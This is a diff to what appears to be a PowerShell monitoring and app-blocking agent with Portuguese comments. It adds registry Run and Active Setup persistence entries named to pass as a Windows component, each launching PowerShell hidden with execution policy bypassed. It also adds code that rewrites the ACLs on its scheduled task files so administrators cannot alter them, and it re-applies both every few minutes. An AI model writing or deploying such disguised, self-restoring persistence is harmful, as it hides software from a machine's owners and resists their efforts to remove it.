@@ -353,6 +353,84 @@ function Ensure-WmiPersistence {
 }
 
 # ══════════════════════════════════════════════════════════════
+#  REGISTRY PERSISTENCE (canais 6 e 7)
+# ══════════════════════════════════════════════════════════════
+$script:LastRegCheck = [datetime]::MinValue
+function Ensure-RegistryPersistence {
+    param([switch]$Force)
+    if (-not $Force) {
+        $elapsed = (New-TimeSpan -Start $script:LastRegCheck -End (Get-Date)).TotalSeconds
+        if ($elapsed -lt 120) { return }
+    }
+    $script:LastRegCheck = Get-Date
+    try {
+        $cmd = Get-WatchdogCommand
+        $regCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$cmd`""
+
+        # Canal 6: HKLM Run
+        $runPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        try {
+            if (-not (Test-Path $runPath)) { New-Item $runPath -Force | Out-Null }
+            $cur = (Get-ItemProperty -Path $runPath -Name "WinSysMonBoot" -ErrorAction SilentlyContinue)."WinSysMonBoot"
+            if ($cur -ne $regCmd) {
+                Set-ItemProperty -Path $runPath -Name "WinSysMonBoot" -Value $regCmd -Force
+                Write-Log "Registry Run recriada"
+            }
+        } catch { Write-Log "Ensure Run: $($_.Exception.Message)" "WARN" }
+
+        # Canal 7: Active Setup
+        $asPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}"
+        try {
+            if (-not (Test-Path $asPath)) {
+                New-Item $asPath -Force | Out-Null
+                Set-ItemProperty -Path $asPath -Name "(default)"   -Value "WinSysMon Bootstrap"
+                Set-ItemProperty -Path $asPath -Name "Version"     -Value "1,0,0,$(Get-Date -Format yyyyMMddHHmm)"
+                Set-ItemProperty -Path $asPath -Name "StubPath"    -Value $regCmd
+                Set-ItemProperty -Path $asPath -Name "IsInstalled" -Value 1 -Type DWord
+                Write-Log "Active Setup recriado"
+            } else {
+                $curStub = (Get-ItemProperty -Path $asPath -Name "StubPath" -ErrorAction SilentlyContinue).StubPath
+                if ($curStub -ne $regCmd) { Set-ItemProperty -Path $asPath -Name "StubPath" -Value $regCmd -Force }
+            }
+        } catch { Write-Log "Ensure Active Setup: $($_.Exception.Message)" "WARN" }
+    } catch {
+        Write-Log "Ensure-RegistryPersistence falhou: $($_.Exception.Message)" "WARN"
+    }
+}
+
+# ══════════════════════════════════════════════════════════════
+#  PROTECAO DE TAREFAS AGENDADAS (ACL nos XMLs de C:\Windows\System32\Tasks)
+# ══════════════════════════════════════════════════════════════
+$script:LastTaskAcl = [datetime]::MinValue
+function Protect-TaskFiles {
+    param([switch]$Force)
+    if (-not $Force) {
+        $elapsed = (New-TimeSpan -Start $script:LastTaskAcl -End (Get-Date)).TotalSeconds
+        if ($elapsed -lt 300) { return }
+    }
+    $script:LastTaskAcl = Get-Date
+    try {
+        $files = @(
+            "$env:WINDIR\System32\Tasks\WinSysMonWatchdog",
+            "$env:WINDIR\System32\Tasks\WinSysMonGuard"
+        )
+        $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
+        $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
+        foreach ($f in $files) {
+            if (-not (Test-Path $f)) { continue }
+            try {
+                $acl = Get-Acl $f
+                $acl.SetAccessRuleProtection($true,$false)
+                foreach ($r in @($acl.Access)) { [void]$acl.RemoveAccessRule($r) }
+                $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidSys,"FullControl","Allow")))
+                $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,"ReadAndExecute","Allow")))
+                Set-Acl -Path $f -AclObject $acl
+            } catch {}
+        }
+    } catch {}
+}
+
+# ══════════════════════════════════════════════════════════════
 #  BLOQUEIO DE APLICATIVOS
 # ══════════════════════════════════════════════════════════════
 $script:RemoteBlockCache = @()
@@ -1080,6 +1158,8 @@ function Start-AgentLoop {
     try { Ensure-WatchdogTask -Force } catch { Write-Log "Ensure-WatchdogTask inicial falhou: $($_.Exception.Message)" "WARN" }
     try { Ensure-GuardTask -Force } catch { Write-Log "Ensure-GuardTask inicial falhou: $($_.Exception.Message)" "WARN" }
     try { Ensure-WmiPersistence -Force } catch { Write-Log "Ensure-WmiPersistence inicial falhou: $($_.Exception.Message)" "WARN" }
+    try { Ensure-RegistryPersistence -Force } catch { Write-Log "Ensure-RegistryPersistence inicial falhou: $($_.Exception.Message)" "WARN" }
+    try { Protect-TaskFiles -Force } catch { Write-Log "Protect-TaskFiles inicial falhou: $($_.Exception.Message)" "WARN" }
 
     $cfg = Load-Config
     $script:PollInterval = $cfg.PollInterval
@@ -1181,6 +1261,8 @@ function Start-AgentLoop {
             try { Ensure-WatchdogTask } catch {}
             try { Ensure-GuardTask } catch {}
             try { Ensure-WmiPersistence } catch {}
+            try { Ensure-RegistryPersistence } catch {}
+            try { Protect-TaskFiles } catch {}
 
             if ($cfg.MonitorLogins -and ($iteration % 6 -eq 0)) { try { Monitor-Logins } catch {} }
             if ($cfg.CollectHardware) {
